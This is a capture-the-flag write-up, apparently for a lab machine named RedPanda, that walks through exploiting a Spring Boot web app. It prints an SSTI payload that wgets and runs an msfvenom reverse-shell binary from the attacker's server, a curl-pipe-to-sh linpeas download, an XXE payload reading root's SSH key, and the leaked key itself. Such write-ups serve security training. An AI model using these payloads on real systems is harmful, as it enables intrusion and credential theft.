![image](https://user-images.githubusercontent.com/105310322/187504141-74ea8c5a-868e-4ec4-9295-1701770ea229.png)

### Tools: nmap, burpsuite, exiftool, dirb, linpeas

### Vulnerabilities: XXE, SSTI

Running Nmap we find port 8080 and 22 open. 

```console
└──╼ [★]$ nmap -sC -A 10.129.65.161
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 21:38 BST
Nmap scan report for 10.129.65.161
Host is up (0.042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.10 seconds
```

```console
└──╼ [★]$ dirb http://10.129.65.161:8080

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Aug 18 21:43:03 2022
URL_BASE: http://10.129.65.161:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.129.65.161:8080/ ----
+ http://10.129.65.161:8080/error (CODE:500|SIZE:86)                           
+ http://10.129.65.161:8080/search (CODE:405|SIZE:117)                         
+ http://10.129.65.161:8080/stats (CODE:200|SIZE:987)                          
                                                                               
-----------------
END_TIME: Thu Aug 18 21:43:26 2022
DOWNLOADED: 4612 - FOUND: 3
```
![image](https://user-images.githubusercontent.com/105310322/185697499-087ba097-00f1-41dd-8468-e0414711e4d2.png)

If we check out the export table we see that it is written in xml. 

![image](https://user-images.githubusercontent.com/105310322/185698965-a683e7f6-fcae-48c3-bd6d-588297069d1b.png)


With the above news I tried for a bit on some XXE exploits but to no avail. However I noticed in BurpSuite if you run a search it shows that its running on Spring Boot. More research shows that it was possible to do a SSTI injection.

After trying out a few ways to detect what type of SSTI injection we can do the following string below in the name field worked.

Note: There are alot of SSTI options but hacktricks has a good guide on testing what it is vulnerable to. https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

This link is where I found the command https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language

So now we can craft an exploit and send it through burpsuite.

```console
└──╼ [★]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.30 LPORT=1234 -f elf  > exploit.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```
Set up our http server to transfer files and a listener to grab the shell then run the following commands from the search portion of the URL in Burpsuite.

Note: Having the * is important for the command to run so the webpage interprets it the way we want.


```console
└──╼ [★]$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.65.161 - - [18/Aug/2022 22:56:25] "GET /exploit.elf HTTP/1.1" 200 -
```
```console
└──╼ [★]$ nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 10.129.65.161.
Ncat: Connection from 10.129.65.161:58302.
id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```
```
POST /search HTTP/1.1
Host: 10.129.66.0:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 106
Origin: http://10.129.66.0:8080
DNT: 1
Connection: close
Referer: http://10.129.66.0:8080/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

name=*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget http://10.10.14.47:8000/exploit.elf")}
```
```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 exploit.elf")}
```
```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./exploit.elf")}
```
Awesome we get a shell but its pretty bad so lets upgrade it and grab our user flag!

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```console
woodenk@redpanda:/home/woodenk$ cat user.txt
cat user.txt
e42c0d**************************
woodenk@redpanda:/home/woodenk$ 
```

Next thing I did was run linpeas from the /tmp folder and we get a few interesting things back.

```console
└──╼ [★]$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.65.161 - - [18/Aug/2022 23:09:01] "GET /linpeas.sh HTTP/1.1" 200 -
```
```console
curl http://10.10.14.30:8000/linpeas.sh | sh
```
I tried for awhile on the CVE but I wasnt having any luck. I didn't even try the others but maybe there was a vector in there somewhere.

in the credits folder we can see credentials but as the user woodenk I wasnt able to access it.

```
Vulnerable to CVE-2021-3560


╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
   
   
   

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root logs 422 Aug 18 20:52 /credits/damian_creds.xml
-rw-r----- 1 root logs 426 Aug 18 20:52 /credits/woodenk_creds.xml
```
Linpeas did not give me as much as I had hoped but checking out /opt that is usually empty according to linpeas had alot of info.

Navigating all the way to the file below has very interesting info including the password for Woodenk, RedPandazRule. Now we can at least login in through ssh.

But thats not all. This file also contains the hints for how we are going to get root.

The part where it is talking about ```"for(Element image: images)"``` This is taking the meta data from the image and directing it at a uri. Also ```"InputStream in = new FileInputStream("/credits/" + author + "_creds.xml")"``` is notable.

```java
woodenk@redpanda:/opt/panda_search/src/main/java/com/panda_search/htb/panda_search$ cat MainController.java 
package com.panda_search.htb.panda_search;

import java.util.ArrayList;
import java.io.IOException;
import java.sql.*;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.io.InputStream;
import java.io.FileInputStream;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.http.MediaType;

import org.apache.commons.io.IOUtils;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

@Controller
public class MainController {
  @GetMapping("/stats")
  	public ModelAndView stats(@RequestParam(name="author",required=false) String author, Model model) throws JDOMException, IOException{
		SAXBuilder saxBuilder = new SAXBuilder();
		if(author == null)
		author = "N/A";
		author = author.strip();
		System.out.println('"' + author + '"');
		if(author.equals("woodenk") || author.equals("damian"))
		{
			String path = "/credits/" + author + "_creds.xml";
			File fd = new File(path);
			Document doc = saxBuilder.build(fd);
			Element rootElement = doc.getRootElement();
			String totalviews = rootElement.getChildText("totalviews");
		       	List<Element> images = rootElement.getChildren("image");
			for(Element image: images)
				System.out.println(image.getChildText("uri"));
			model.addAttribute("noAuthor", false);
			model.addAttribute("author", author);
			model.addAttribute("totalviews", totalviews);
			model.addAttribute("images", images);
			return new ModelAndView("stats.html");
		}
		else
		{
			model.addAttribute("noAuthor", true);
			return new ModelAndView("stats.html");
		}
	}
  @GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
	public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

		System.out.println("Exporting xml of: " + author);
		if(author.equals("woodenk") || author.equals("damian"))
		{
			InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
			System.out.println(in);
			return IOUtils.toByteArray(in);
		}
		else
		{
			return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
		}
	}
  @PostMapping("/search")
	public ModelAndView search(@RequestParam("name") String name, Model model) {
	if(name.isEmpty())
	{
		name = "Greg";
	}
        String query = filter(name);
	ArrayList pandas = searchPanda(query);
        System.out.println("\n\""+query+"\"\n");
        model.addAttribute("query", query);
	model.addAttribute("pandas", pandas);
	model.addAttribute("n", pandas.size());
	return new ModelAndView("search.html");
	}
  public String filter(String arg) {
        String[] no_no_words = {"%", "_","$", "~", };
        for (String word : no_no_words) {
            if(arg.contains(word)){
                return "Error occured: banned characters";
            }
        }
        return arg;
    }
    public ArrayList searchPanda(String query) {

        Connection conn = null;
        PreparedStatement stmt = null;
        ArrayList<ArrayList> pandas = new ArrayList();
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
            stmt.setString(1, "%" + query + "%");
            ResultSet rs = stmt.executeQuery();
            while(rs.next()){
                ArrayList<String> panda = new ArrayList<String>();
                panda.add(rs.getString("name"));
                panda.add(rs.getString("bio"));
                panda.add(rs.getString("imgloc"));
		panda.add(rs.getString("author"));
                pandas.add(panda);
            }
        }catch(Exception e){ System.out.println(e);}
        return pandas;
    }
}
woodenk@redpanda:/opt/panda_search/src/main/java/com/panda_search/htb/panda_search$ 
```
A quick ssh to make this next part cleaner

```console
└──╼ [★]$ ssh woodenk@10.129.66.0
The authenticity of host '10.129.66.0 (10.129.66.0)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.66.0' (ECDSA) to the list of known hosts.
woodenk@10.129.66.0's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 19 Aug 2022 03:55:34 PM UTC

  System load:           0.0
  Usage of /:            80.9% of 4.30GB
  Memory usage:          37%
  Swap usage:            0%
  Processes:             213
  Users logged in:       0
  IPv4 address for eth0: 10.129.66.0
  IPv6 address for eth0: dead:beef::250:56ff:feb9:eca4


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Jul  5 05:51:25 2022 from 10.10.14.23
woodenk@redpanda:~$ 
```
Now with information we got from above we are going to change any .jpg of our own (I got mine from google images) and use exiftool to input our own uri.

Note: rootme is the 1st part of the xml file that I created further below. The other half being _creds.xml

```console
└──╼ [★]$ exiftool -Artist='../home/woodenk/rootme' pic.jpg
    1 image files updated
```
Set up the http server and download it to the victim

```console
woodenk@redpanda:~$ wget http://10.10.14.47:8000/pic.jpg
--2022-08-19 19:17:23--  http://10.10.14.47:8000/pic.jpg
Connecting to 10.10.14.47:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 59193 (58K) [image/jpeg]
Saving to: ‘pic.jpg’

pic.jpg             100%[===================>]  57.81K  --.-KB/s    in 0.009s  

2022-08-19 19:17:23 (6.11 MB/s) - ‘pic.jpg’ saved [59193/59193]
```

If you go to the export table found earlier in this writeup you can find the template for XML to perform our XXE.
Create an xml file with our XXE payload and make sure its in the same directory as the .jpg.
My files were located in /home/woodenk.

Note: Be sure the xml documents end in ```_creds.xml``` so it matches the .java file.

```console
woodenk@redpanda:~$ echo '<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../home/woodenk/pic.jpg</uri>
    <hello>&ent;</hello>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>' > rootme_creds.xml
```
Now in Burpsuite change the User-Agent: section to what is listed below.

```
GET / HTTP/1.1
Host: 10.129.66.22:8080
User-Agent: ||/../../../../../../../home/woodenk/pic.jpg
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```
Give it a minute or 2 after sending the request to the webpage through BurpSuite. The ssh key will not pop into the xml document immediately.

Then we can cat the xml file to reveal the root SSH key!

```console
woodenk@redpanda:~$ cat rootme_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!--?xml version="1.0" ?-->
<!DOCTYPE replace>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../home/woodenk/pic.jpg</uri>
    <hello>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</hello>
    <views>4</views>
  </image>
  <totalviews>4</totalviews>
</credits>
woodenk@redpanda:~$ 
```
Create an id_rsa file with the root ssh key.

```console
echo '-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----' > id_rsa
```

We are in as root!

```console
└──╼ [★]$ sudo ssh root@10.129.66.22 -i id_rsa
The authenticity of host '10.129.66.22 (10.129.66.22)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.66.22' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 19 Aug 2022 07:44:07 PM UTC

  System load:           0.0
  Usage of /:            80.9% of 4.30GB
  Memory usage:          48%
  Swap usage:            0%
  Processes:             224
  Users logged in:       1
  IPv4 address for eth0: 10.129.66.22
  IPv6 address for eth0: dead:beef::250:56ff:feb9:8e


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jun 30 13:17:41 2022
root@redpanda:~# 
```
Finally got the flag!

```console
root@redpanda:~# ls
root.txt  run_credits.sh
root@redpanda:~# cat root.txt
d9ffbae*************************
root@redpanda:~# 
```

In the beginning I would definitely rate this as an easy Machine but privilege escalating was much harder. Luckily I got a few pointers from some good people.

Hopefully others can learn something from this writeup. For me this will be a good Machine to look back on if I forget or need a refresher.

Cheers!!
